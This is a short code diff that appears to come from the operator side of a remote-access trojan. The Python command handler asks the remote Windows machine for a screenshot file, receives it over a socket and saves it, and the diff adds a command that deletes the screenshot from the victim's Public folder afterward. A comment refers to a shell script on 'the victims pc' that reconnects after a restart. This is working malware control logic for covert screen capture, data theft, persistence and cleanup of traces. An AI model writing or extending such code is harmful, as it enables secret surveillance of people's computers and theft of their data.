@@ -346,17 +346,18 @@ class Commands:
             # waits for file creation
             sleep(1)
             # request file
-            sendMessage(f"r C:\\Users\\Public\\monitor-1.png")
+            sendMessage("r C:\\Users\\Public\\monitor-1.png")
             pic = conn.recv(2048)
             name = f"screenshot{randint(0, 1000)}.png"
             while pic:
-                print(pic)
                 if pic[-4:] != b"done":
                     with open(f"{name}", "ab") as file:
                         file.write(pic)
                     pic = conn.recv(2048)
                 else:
+                    sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                     return
+
 
                     # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
